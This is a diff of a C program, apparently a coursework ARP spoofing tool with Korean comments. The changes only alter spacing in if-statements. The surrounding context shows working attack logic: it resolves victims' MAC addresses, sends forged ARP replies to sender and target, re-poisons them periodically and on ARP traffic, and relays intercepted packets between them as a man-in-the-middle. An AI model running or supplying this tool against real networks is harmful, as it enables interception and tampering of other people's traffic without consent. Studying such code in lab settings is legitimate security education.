@@ -37,7 +37,7 @@ int search_my_ip(char* interface, uint32_t* my_ip) {
     int sock;
 
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
-    if (sock < 0) {
+    if(sock < 0) {
         perror("socket");
         return 1;
     }
@@ -45,7 +45,7 @@ int search_my_ip(char* interface, uint32_t* my_ip) {
     strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
     ifr.ifr_name[IFNAMSIZ - 1] = '\0';
 
-    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
+    if(ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
         perror("ioctl");
         close(sock);
         return 1;
@@ -62,7 +62,7 @@ int search_my_mac(char* interface, uint8_t* my_mac) {
     int sock;
 
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
-    if (sock < 0) {
+    if(sock < 0) {
         perror("socket");
         return 1;
     }
@@ -70,7 +70,7 @@ int search_my_mac(char* interface, uint8_t* my_mac) {
     strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
     ifr.ifr_name[IFNAMSIZ - 1] = '\0';
 
-    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
+    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
         perror("ioctl");
         close(sock);
         return 1;
@@ -90,17 +90,17 @@ int get_arp_packet(pcap_t* pcap, struct etharpkt* t_packet, uint32_t target_ip) 
 
     while (1) {
         res = pcap_next_ex(pcap, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) {
+        if(res == 0) continue;
+        if(res == -1 || res == -2) {
             perror("pcap_next_ex");
             return -1;
         }
 
         pkt = (struct etharpkt*)packet;
 
-        if (ntohs(pkt->eth.eth_type) != 0x0806) continue;
-        if (ntohs(pkt->arp.opcode) != 2) continue;
-        if (pkt->arp.sip != target_ip) continue;
+        if(ntohs(pkt->eth.eth_type) != 0x0806) continue;
+        if(ntohs(pkt->arp.opcode) != 2) continue;
+        if(pkt->arp.sip != target_ip) continue;
 
         memcpy(t_packet, pkt, sizeof(struct etharpkt));
 
@@ -115,7 +115,7 @@ int main(int argc, char* argv[]){
     }
 
     int pair_count = (argc / 2) - 1;  // 처리할 쌍의 개수
-    if (pair_count > MAX_PAIRS) {
+    if(pair_count > MAX_PAIRS) {
         fprintf(stderr, "Too many pairs (max %d)\n", MAX_PAIRS);
         return 1;
     }
@@ -168,7 +168,7 @@ int main(int argc, char* argv[]){
         
         // sender MAC 찾기
         request_pkt.arp.tip = inet_addr(argv[2 + (i * 2)]);
-        if (pcap_sendpacket(pcap, (const u_char*)&request_pkt, sizeof(struct etharpkt)) != 0) {
+        if(pcap_sendpacket(pcap, (const u_char*)&request_pkt, sizeof(struct etharpkt)) != 0) {
             fprintf(stderr, "Error: Failed to send request packet\n");
             pcap_close(pcap);
             exit(EXIT_FAILURE);
@@ -180,7 +180,7 @@ int main(int argc, char* argv[]){
 
         // target MAC 찾기
         request_pkt.arp.tip = inet_addr(argv[3 + (i * 2)]);
-        if (pcap_sendpacket(pcap, (const u_char*)&request_pkt, sizeof(struct etharpkt)) != 0) {
+        if(pcap_sendpacket(pcap, (const u_char*)&request_pkt, sizeof(struct etharpkt)) != 0) {
             fprintf(stderr, "Error: Failed to send request packet\n");
             pcap_close(pcap);
             exit(EXIT_FAILURE);
@@ -218,10 +218,10 @@ int main(int argc, char* argv[]){
         memcpy(attack_pkt_target[i].arp.tmac, tmac[i], 6);
         attack_pkt_target[i].arp.tip = inet_addr(argv[3 + (i * 2)]);  // target IP
 
-        if (pcap_sendpacket(pcap, (const u_char*)&attack_pkt_sender[i], sizeof(struct etharpkt)) != 0) {
+        if(pcap_sendpacket(pcap, (const u_char*)&attack_pkt_sender[i], sizeof(struct etharpkt)) != 0) {
             fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
         }
-        if (pcap_sendpacket(pcap, (const u_char*)&attack_pkt_target[i], sizeof(struct etharpkt)) != 0) {
+        if(pcap_sendpacket(pcap, (const u_char*)&attack_pkt_target[i], sizeof(struct etharpkt)) != 0) {
             fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
         }
         printf("Sent ARP spoof packets (5 times each)\n");
@@ -262,7 +262,7 @@ int main(int argc, char* argv[]){
         pkt = (struct etharpkt*)packet;
 
         // ARP 패킷이면 모든 쌍에 대해 재공격 sender와 target 모두에게 한번에 해야한다.
-        if (ntohs(pkt->eth.eth_type) == 0x0806) {
+        if(ntohs(pkt->eth.eth_type) == 0x0806) {
             if(memcmp(pkt->eth.smac, my_mac, 6) == 0) continue;
 
             for(int i = 0; i < pair_count; i++){
@@ -273,13 +273,13 @@ int main(int argc, char* argv[]){
 
         // 정기적인 ARP 재공격 15초마다
         time_t current_time = time(NULL);
-        if (difftime(current_time, last_arp_attack) >= ARP_ATTACK_INTERVAL) {
+        if(difftime(current_time, last_arp_attack) >= ARP_ATTACK_INTERVAL) {
             printf("Sending periodic ARP re-attack packets...\n");
             for(int i = 0; i < pair_count; i++){
-                if (pcap_sendpacket(pcap, (const u_char*)&attack_pkt_sender[i], sizeof(struct etharpkt)) != 0) {
+                if(pcap_sendpacket(pcap, (const u_char*)&attack_pkt_sender[i], sizeof(struct etharpkt)) != 0) {
                     fprintf(stderr, "Error sending periodic ARP packet: %s\n", pcap_geterr(pcap));
                 }
-                if (pcap_sendpacket(pcap, (const u_char*)&attack_pkt_target[i], sizeof(struct etharpkt)) != 0) {
+                if(pcap_sendpacket(pcap, (const u_char*)&attack_pkt_target[i], sizeof(struct etharpkt)) != 0) {
                     fprintf(stderr, "Error sending periodic ARP packet: %s\n", pcap_geterr(pcap));
                 }
             }
@@ -294,14 +294,14 @@ int main(int argc, char* argv[]){
             // sender -> attacker -> target 방향
             if(memcmp(pkt->eth.smac, vmac[i], 6) == 0 && memcmp(pkt->eth.dmac, my_mac, 6) == 0){
                 struct etharpkt* modified_pkt = (struct etharpkt*)malloc(header->len);
-                if (modified_pkt == NULL) {
+                if(modified_pkt == NULL) {
                     fprintf(stderr, "Memory allocation failed\n");
                     continue;
                 }
                 memcpy(modified_pkt, pkt, header->len);
                 memcpy(modified_pkt->eth.smac, my_mac, 6);
                 memcpy(modified_pkt->eth.dmac, tmac[i], 6);
-                if (pcap_sendpacket(pcap, (const u_char*)modified_pkt, header->len) != 0) {
+                if(pcap_sendpacket(pcap, (const u_char*)modified_pkt, header->len) != 0) {
                     fprintf(stderr, "Error relaying packet: %s\n", pcap_geterr(pcap));
                 }
                 free(modified_pkt);
@@ -310,14 +310,14 @@ int main(int argc, char* argv[]){
             // target -> attacker -> sender 방향
             if(memcmp(pkt->eth.smac, tmac[i], 6) == 0 && memcmp(pkt->eth.dmac, my_mac, 6) == 0){
                 struct etharpkt* modified_pkt = (struct etharpkt*)malloc(header->len);
-                if (modified_pkt == NULL) {
+                if(modified_pkt == NULL) {
                     fprintf(stderr, "Memory allocation failed\n");
                     continue;
                 }
                 memcpy(modified_pkt, pkt, header->len);
                 memcpy(modified_pkt->eth.smac, my_mac, 6);
                 memcpy(modified_pkt->eth.dmac, vmac[i], 6);
-                if (pcap_sendpacket(pcap, (const u_char*)modified_pkt, header->len) != 0) {
+                if(pcap_sendpacket(pcap, (const u_char*)modified_pkt, header->len) != 0) {
                     fprintf(stderr, "Error relaying packet: %s\n", pcap_geterr(pcap));
                 }
                 free(modified_pkt);
